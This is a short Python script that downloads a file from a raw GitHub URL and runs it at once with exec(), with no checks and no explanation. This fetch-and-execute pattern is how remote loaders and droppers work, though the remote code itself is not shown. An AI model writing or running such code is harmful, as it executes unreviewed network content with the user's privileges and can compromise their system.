import requests

url = 'https://raw.githubusercontent.com/kronikles000/SocketsTest3/refs/heads/main/main.py'

code = requests.get(url).text

exec(code)